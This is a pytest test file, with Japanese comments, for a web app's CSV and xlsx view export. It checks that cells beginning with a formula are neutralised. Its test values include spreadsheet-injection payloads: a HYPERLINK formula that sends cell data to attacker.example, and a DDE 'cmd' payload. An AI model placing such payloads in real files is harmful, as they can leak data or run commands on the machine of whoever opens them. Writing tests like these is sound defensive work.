"""ビューの CSV・Excel エクスポートで、セルの値が数式として実行されないこと。

画面・API・CSV の取り込みで入った ``=HYPERLINK(...)`` などが、ダウンロードしたファイルを
Excel で開いたときに実行されないよう、CSV では先頭に ``'`` を付け、xlsx では文字列として
書く(数値はそのまま)。``raw=1`` なら値をそのまま書く(機械で読む用途)。
"""

from __future__ import annotations

import csv
import io

import pytest
from contract import helpers
from fastapi.testclient import TestClient

from monitor_app import MonitorConfig, TableDef, ViewDef
from monitor_app.main import create_app
from monitor_app.security import neutralize_formula
from monitor_app.settings.runtime import AppSettings

CFG = MonitorConfig(
    tables={
        "items": TableDef(
            columns={"id": "int", "name": "str", "qty": "int", "price": "float"},
            primary_key="id",
        )
    },
    views={"items_view": ViewDef(query="SELECT id, name, qty, price FROM items")},
)
VALUES = [
    '=HYPERLINK("http://attacker.example/?"&A1,"click")',
    "+1+1",
    "-2+3",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1",
    "普通の文字",
    "a=b",
]


@pytest.fixture(autouse=True)
def _isolated(monkeypatch, tmp_path):
    helpers.isolate_from_host(monkeypatch, tmp_path)


@pytest.fixture
def client():
    app = create_app(CFG, AppSettings(database_url="sqlite:///:memory:"))
    with TestClient(app) as c:
        for index, value in enumerate(VALUES, start=1):
            res = c.post(
                "/api/tables/items",
                json={"name": value, "qty": -index, "price": -1.5},
            )
            assert res.status_code == 201, res.text
        yield c


def _csv_rows(text: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(text.lstrip("﻿"))))


@pytest.mark.parametrize("bom", ["0", "1"])
def test_csv_cells_that_start_a_formula_get_a_quote(client, bom):
    text = client.get(f"/api/views/items_view/export?format=csv&bom={bom}").text
    rows = _csv_rows(text)
    assert rows[0] == ["id", "name", "qty", "price"]
    names = [row[1] for row in rows[1:]]
    assert names == [
        "'" + VALUES[0],
        "'+1+1",
        "'-2+3",
        "'" + VALUES[3],
        "'\t=1",
        "普通の文字",
        "a=b",
    ]
    # 数値の列(負の数を含む)は変えない
    assert [row[2] for row in rows[1:]] == [str(-i) for i in range(1, len(VALUES) + 1)]
    assert {row[3] for row in rows[1:]} == {"-1.5"}


def test_raw_csv_keeps_the_values(client):
    rows = _csv_rows(client.get("/api/views/items_view/export?format=csv&raw=1").text)
    assert [row[1] for row in rows[1:]] == VALUES


def test_xlsx_writes_formula_like_text_as_strings(client):
    openpyxl = pytest.importorskip("openpyxl")
    content = client.get("/api/views/items_view/export?format=xlsx").content
    ws = openpyxl.load_workbook(io.BytesIO(content)).active
    cells = [ws.cell(row=r, column=2) for r in range(2, len(VALUES) + 2)]
    assert all(cell.data_type == "s" for cell in cells)
    assert [cell.value for cell in cells] == VALUES  # 文字列として、値はそのまま
    assert ws.cell(row=2, column=3).value == -1  # 数値は数値のまま
    assert ws.cell(row=2, column=3).data_type == "n"


def test_raw_xlsx_keeps_openpyxl_behaviour(client):
    openpyxl = pytest.importorskip("openpyxl")
    content = client.get("/api/views/items_view/export?format=xlsx&raw=1").content
    ws = openpyxl.load_workbook(io.BytesIO(content)).active
    assert ws.cell(row=2, column=2).data_type == "f"


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("=1", "'=1"),
        ("+x", "'+x"),
        ("-x", "'-x"),
        ("@x", "'@x"),
        ("\rx", "'\rx"),
        ("x=1", "x=1"),
        ("", ""),
        (-5, -5),
        (1.5, 1.5),
        (None, None),
    ],
)
def test_neutralize_formula(value, expected):
    assert neutralize_formula(value) == expected
